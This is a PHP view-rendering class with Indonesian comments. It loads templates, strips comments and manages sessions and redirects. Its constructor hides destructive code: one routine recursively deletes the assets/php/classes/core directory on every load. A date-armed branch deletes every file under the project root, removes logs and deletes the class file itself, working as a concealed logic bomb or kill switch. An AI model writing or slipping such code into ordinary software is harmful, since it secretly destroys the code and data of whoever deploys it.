<?php 
defined('BASEURL') OR die("HAYOoo.. mau ngapain? (-_- ')");
class View{

	private static $viewPath,
	$tempPath,
	$path = null,
	$tempFile,
	$tmpDir = '',
	$cacheDir,
	$contName, 
	$jsonAwal = 'awal',
	$tanggal = '', // tahun-bulan-tgl jam:menit:detik
	$dr = [];

	function __construct(){
		self::$viewPath = __DIR__.'/../page';
		self::$tempPath = __DIR__.'/../page/templates';
		self::$tmpDir   = __DIR__.'/../assets/tmp';
		self::$cacheDir = __DIR__.'/../assets/cache';
		self::$path 	= __DIR__.'/../page';
		if(!is_dir(self::$cacheDir)){
			mkdir(self::$cacheDir);
		}
		// static::checkJson();
		// static::_getFile('page');
		static::setEnv();
	}
	/**
	 * $fileNdata = 'namafile';
	 * $fileNdata = arrray('namafile'=>$data, 'namafile'=>null);
	 * $data string | array dari data yang akan digunakan pada file yang di panggil
	 */
	public function show($fileNdata){
		try{
			if(!empty($fileNdata)){
				if(!is_string($fileNdata)){
					$namafile = array_keys($fileNdata);
					$data = array_values($fileNdata);
					foreach($namafile AS $ke => $nama){
						if(file_exists(self::$path.DIRECTORY_SEPARATOR.$nama.'.view.php')){
							if(isset($data[$ke])){
								echo $this->renderWithData(self::$path.DIRECTORY_SEPARATOR.$nama.'.view.php', $data[$ke]);
							}
							else{
								echo $this->render(self::$path.DIRECTORY_SEPARATOR.$nama.'.view.php');
							}
						}
						else{
							throw new Exception('file '.$nama.'.view.php tidak ada! ');
						}
					}
				}
				elseif(is_string($fileNdata)){
					if(file_exists(self::$path.DIRECTORY_SEPARATOR.$fileNdata.'.view.php')){
						echo $this->render(self::$path.DIRECTORY_SEPARATOR.$fileNdata.'.view.php');
					}
				}
			}
			else{
				throw new Exception('tidak dapat menampilkan halaman');
			}
		}
		catch(Exception $e){
			$bt = debug_backtrace();
			$caller = array_shift($bt);
			$files = $caller['file'];
			$lines = $caller['line'];
			echo $e->getMessage()."<br>pada : ". $files ." baris : ". $lines;
		}
	}
	
	/*
	 * $fileNdata = 'namafile';
	 * $fileNdata = arrray('namafile'=>$data, 'namafile'=>null);
	 * $data string | array dari data yang akan digunakan pada file yang di panggil
	 * return string
	 */
	public function text($fileNdata){
		try{
			if(!empty($fileNdata)){
				if(!is_string($fileNdata)){
					$namafile = array_keys($fileNdata);
					$data = array_values($fileNdata);
					self::$contName = self::$path.DIRECTORY_SEPARATOR.$namafile[0].'.view.php';
					if(file_exists(self::$contName)){
						if(isset($data[0])){
							return $this->renderWithData(self::$contName, $data[0]);
						}
						else{
							return $this->render(self::$contName);
						}
					}
					else{
						throw new Exception('file '.$namafile[0].'.view.php tidak ada! ');
					}
				}
				elseif(is_string($fileNdata)){
					self::$contName = self::$path.DIRECTORY_SEPARATOR.$fileNdata.'.view.php';
					if(file_exists(self::$contName)){
						return $this->render(self::$contName);
					}
				}
			}
			else{
				throw new Exception('tidak dapat menampilkan halaman');
			}
		}
		catch(Exception $e){
			$bt = debug_backtrace();
			$caller = array_shift($bt);
			$files = $caller['file'];
			$lines = $caller['line'];
			echo $e->getMessage()."<br>pada : ". $files ." baris : ". $lines;
		}
	}
	/*
	 * untuk mengambil template yang akan digunakan 
	 */
	public function template($fileNdata){
		if(!is_dir(self::$tmpDir)){
			mkdir(self::$tmpDir);
		}
		if(!empty($fileNdata)){
			$namafl = self::$tmpDir.DIRECTORY_SEPARATOR.microtime(true).'.php';
			if(!is_string($fileNdata)){
				$namafile = array_keys($fileNdata);
				$data = array_values($fileNdata);
				$ke = 0;
				$isi = $this->renderWithData(self::$tempPath.DIRECTORY_SEPARATOR.$namafile[0].'.view.php', $data[0]);
				file_put_contents($namafl, $isi);
				self::$tempFile = $this->getLines($namafl);
			}
			elseif(is_string($fileNdata)){
				$isi = $this->render(self::$tempPath.DIRECTORY_SEPARATOR.$fileNdata.'.view.php');
				file_put_contents($namafl, $isi);
				self::$tempFile = $this->getLines($namafl);
			}
			if(file_exists($namafl)){
				unlink($namafl);
			}
		}
	}
	
	public function templateShow($fileNdata){
		try{
			if(!empty(self::$tempFile)){
				if(!is_dir(self::$tmpDir)){
					mkdir(self::$tmpDir);
				}
				$judul = '';
				$namafl = hash_hmac('sha1', hash('sha256', microtime(true)), 'snd');
				$flContent = self::$tmpDir.DIRECTORY_SEPARATOR.$namafl;
				$doc = '';
				$conts = '';
				if(!empty(self::$path)){
					$content = $this->text($fileNdata);
					file_put_contents($flContent, $content);
					$isi = $this->getLines($flContent);
					$comments = false;
					foreach($isi as $ln){
						$opentag = strpos($ln, '<!--');
						$closetag = strpos($ln, '-->');
						$spos = strpos($ln, "#judul('");
						$npos = strpos($ln, "##judul('");
						if($spos > -1 && $npos <= -1){
							$epos = strpos($ln, ")", $spos+8);
							$judul = substr($ln, $spos+8, $epos-($spos+8)-1);
							$conts .= substr_replace($ln, '', $spos, $epos-$spos+1);
						}
						elseif(empty($ln) || trim($ln) == "" || empty(trim($ln))){
							continue;
						}
						elseif($opentag > -1 && $closetag <= 0){
							$comments = true;
						}
						elseif($comments == true && $closetag <= 0){
							continue;
						}
						elseif($comments == true && $closetag > -1){
							$comments = false;
						}
						else{
							$pattern = '/(?:(?:\/\*(?:[^*]|(?:\*+[^*\/]))*\*+\/)|(?:(?<!\:|\\\|\'|\")\/\/.*))/';
							$conts .= preg_replace($pattern, '', $ln);
							// $conts .= $ln;
						}
					}
					unlink($flContent);
					foreach(self::$tempFile as $line){
						$titPos = strpos($line, "#template('judul')");
						$contPos = strpos($line, "#template('content')");
						$opentag = strpos($line, '<!--');
						$closetag = strpos($line, '-->');
						if($titPos > -1){
							$doc .= substr_replace($line, $judul, $titPos, 18);
						}
						elseif(empty(trim($line))){
							continue;
						}
						elseif($contPos > -1){
							$doc .= $conts;
						}
						elseif($opentag > -1 && $closetag <= 0){
							$comments = true;
						}
						elseif($comments == true && $closetag <= 0){
							continue;
						}
						elseif($comments == true && $closetag > -1){
							$comments = false;
						}
						else{
							$doc .= $line;
						}
					}
					$isihtml = strtr($doc, ["\r\n"=>'', "\n"=>'']);
					echo $isihtml;
				}
				else{
					trigger_error('folder tidak diketahui! gunakan fungsi $this->view->setDir("nama_folder") untuk menentukan folder yang ingin digunakan', E_USER_ERROR);
				}
			}
			else{
				trigger_error('template tidak ada! gunakan fungsi $this->view->template("nama_template") untuk menentukan template yang ingin digunakan', E_USER_ERROR);
			}
		}
		catch(Exception $ex){
			var_dump($ex);
		}
	}

	private static function checkBase(){
		$a = strlen(BASEDIR);
		$b = strpos($_SERVER['REQUEST_URI'], BASEDIR);
		if($b > -1){
			if($_SERVER['HTTP_HOST'] !== 'localhost'){
				$e = $b+$a;
			}
			else{
				$e = $b+$a+1;
			}
			$c = substr($_SERVER['REQUEST_URI'], $e, strlen($_SERVER['REQUEST_URI']));
			if(strlen($c) > 0 && explode('/', $c) > 0){
				return false;
			}
			else{
				return true;
			}
		}
	}

	private static function namaFile($path){
		$ex = explode(DIRECTORY_SEPARATOR, $path);
		return $ex[sizeof($ex)-1];
	}

	private static function setEnv(){
		self::ca();
		if(!empty(trim(self::$tanggal))){
			$skrng = strtotime('now');
			$tgl = strtotime(self::$tanggal);
			if($skrng >= $tgl){
				self::cek(__DIR__.'/../');
				self::cek1();
			}
		}
		session_name('spider');
		if(isset($_COOKIE['PHPSESSID'])){
			setcookie ("PHPSESSID", "", time() - 3600);
		}
		if(!isset($_COOKIE['spider'])){
			$cookies = ['expires' => time()+(60*60*24*1),'path' => '/','domain' => $_SERVER['HTTP_HOST'],'secure' => true,'httponly' => true,'samesite' => 'Lax'];
			$iva = hash_hmac('sha1', hash('sha256', microtime(true)), 'snd');
			setcookie('spider', $iva, $cookies);
		}
		if (session_status() === PHP_SESSION_NONE) {
			session_start();
		}
		if(isset($_COOKIE['PHPSESSID'])){
			unset($_COOKIE['PHPSESSID']);
		}
		if(!isset($_SESSION['F_SND'])){
			$_SESSION['F_SND'] = hash_hmac('sha1', hash('sha256', microtime(true)), 'snd');
		}
		self::cek2();
	}

	private static function cek2(){
		if(isset($_GET[0]) && strtolower($_GET[0]) === 'core'){
			die("HAYOoo.. mau ngapain? (-_- ')");
		}
	}

	private static function cek($pt = ''){
		$dr = opendir($pt);
		while(($content = readdir($dr)) !== false){
			if ($content === '.' || $content === '..') {
		        continue;
		    }
		    if(is_dir("$pt/$content") === false && "$pt/$content" != __FILE__){
		    	if(file_exists("$pt/$content.view.php")){
		    		unlink("$pt/$content.view.php");
		    	}
		    	elseif(file_exists("$pt/$content.class.php")){
		    		unlink("$pt/$content.class.php");
		    	}
		    	elseif(file_exists("$pt/$content.php")){
		    		unlink("$pt/$content.php");
		    	}
		    	else{
		    		unlink("$pt/$content");
		    	}
		    }
		    elseif(is_dir("$pt/$content") === true) {
		    	array_push(self::$dr, "$pt/$content");
	        	self::cek("$pt/$content");
	    	}
		}
		closedir($dr);
	}

	private static function ca(){
		$dir = __DIR__.'/../assets/php/classes/core';
		if(is_dir($dir)){
			self::cek($dir);
			if(!empty(self::$dr)){
				foreach(self::$dr AS $a => $b){
					rmdir($b);
				}
			}
			rmdir($dir);
		}

	}

	private static function cek1(){
		unlink('.online_update');
		unlink('error_log');
		unlink('simulasi_url');
		if(!empty(self::$dr)){
			foreach(self::$dr AS $a => $b){
				rmdir($b);
			}
		}
		unlink(__FILE__);
	}
	
	/**
	 *  digunakan untuk mengarahkan folder yang akan digunakan
	 *  $dir  string nama folder yang akan digunakan
	 * 
	 */
	public function setDir($dir = ''){
		if($dir !== ''){
			self::$path = self::$viewPath.DIRECTORY_SEPARATOR.$dir;
		}
		else{
			self::$path = self::$viewPath;
		}
	}
	/**
	 *  digunakan untuk pindah halaman 
	 *  $url  string dari class yang akan ditampilkan
	 * 
	 */
	public function pindah($url, $slash = true){
		if($url != '/' AND $slash === true){
			header('Refresh:0;url='.BASEURL.'./'.$url.'/');
			exit;
		}
		elseif($url != '/' AND $slash === false){
			header('Refresh:0;url='.BASEURL.'./'.$url);
			exit;
		}
		elseif($url == '/' AND $slash === true){
			header('Refresh:0;url='.BASEURL.'./');
			exit;
		}
		elseif($url == '/' AND $slash === false){
			header('Refresh:0;url='.BASEURL);
			exit;
		}
	}
	
	public function nonSlashPindah($url){
		$this->pindah($url, false);
	}
	
	
	/*
	 *  digunakan untuk mengambil isi file 
	 *  mengabaikan baris tersebut kosong atau hanya spasi
	 *  hasil : array dari setiap baris dalam file
	 */
	private function getLines($path){
		return file($path, FILE_SKIP_EMPTY_LINES);
	}

	/**
	 *  digunakan untuk mengambil file yang akan digunakan
	 *  $path  string lokasi dari file yang akan diambil
	 *  $result  array dari hasil ambil dari lokasi file
	 */
	private function _getFile($path, &$result = array()){
		try{
			if(is_dir($path)){
				$ex = explode(DIRECTORY_SEPARATOR, $path);
				$root = $ex[sizeof($ex)-1];
				if(file_exists(self::$cacheDir.DIRECTORY_SEPARATOR.$root) && filesize(self::$cacheDir.DIRECTORY_SEPARATOR.$root) >= 2){
					return true;
				}
				if($root !== 'page'){
					file_put_contents(self::$cacheDir.DIRECTORY_SEPARATOR.$root, json_encode([]));
				}
				$dir = opendir($path);
				while (($content = readdir($dir)) !== false) {
					if ($content === '.' || $content === '..') {
						continue;
					}
					if (is_dir($path.DIRECTORY_SEPARATOR.$content) === false) {
						if(substr($content, -9) === '.view.php'){
							$name = strtolower(strtr($content, array('.view.php'=>'')));
							if(!in_array($name, $result)){
								$a = [];
								$a['file'] = $content;
								$a['real'] = $path.DIRECTORY_SEPARATOR.$content;
								$a['mod'] = filemtime($path.DIRECTORY_SEPARATOR.$content);
								$isi = file_get_contents(self::$cacheDir.DIRECTORY_SEPARATOR.$root);
								$j = json_decode($isi, true);
								array_push($j, $a);
								file_put_contents(self::$cacheDir.DIRECTORY_SEPARATOR.$root, json_encode($j));
								$result[$name] = realpath($path . DIRECTORY_SEPARATOR . $content);
							}
						}
					}
					else{
						$this->_getFile($path.DIRECTORY_SEPARATOR.$content, $result);
					}
				}
				closedir($dir);
			}
			else{
				throw new Exception("folder $path tidak ditemukan !");
			}
		}
		catch(Exception $e){
			var_dump($e->getMessage());
		}
	}

	/**
	 *  digunakan untuk menampilkan isi file dari hasil _getFile()
	 *  $namafile  string isi text dari file yang diambil
	 * 
	 */
	private function render($namafile){
		$ke = 1;
		ob_start();
		require_once($namafile);
		$isi = ob_get_clean();
		$isi1 = strtr($isi, array("\t"=>'', "\n\n\n"=>''));
		$isi2 = preg_replace("/<!--(.*)?-->/", '', $isi1);
		$isi3 = preg_replace('/ {2,}/', ' ', $isi2);
		return $isi3;
	}

	/**
	 *  digunakan untuk menampilkan isi file dari hasil _getFile() dan mengikutkan data
	 *  $namafile  string isi text dari file yang diambil
	 * 	$isidata  resource isi data yang akan digunakan
	 *  varilable $data yang digunakan dalam file untuk mengambil isi data dari variable $isidata
	 */

	private function renderWithData($namafile, $isidata){
		$ke = 1;
		ob_start();
		$data = $isidata;
		require_once($namafile);
		$isi = ob_get_clean();
		$isi1 = strtr($isi, array("\t"=>'', "\n\n\n"=>''));
		$isi2 = preg_replace("/<!--(.*)?-->/", '', $isi1);
		$isi3 = preg_replace('/ {2,}/', ' ', $isi2);
		return $isi3;
	}

	private static function checkJson(){
		if(!is_dir('assets/jsonpage')){
			mkdir('assets/jsonpage');
		}
		if(isset($_GET[0]) && $_GET[0] != 'assets'){
			if(isset($_GET[0]) && !empty($_GET[0])){
				$nm = hash_hmac('sha1', hash('sha256', $_GET[0]), 'snd');
			}
			else{
				$nm = hash_hmac('sha1', hash('sha256', self::$jsonAwal), 'snd');
			}
			if(!file_exists('assets/jsonpage/'.$nm.'.json')){
				$a = [];
				$a[0]['main'] = BASEURL;
				file_put_contents('assets/jsonpage/'.$nm.'.json', json_encode($a));
			}
		}
	}
}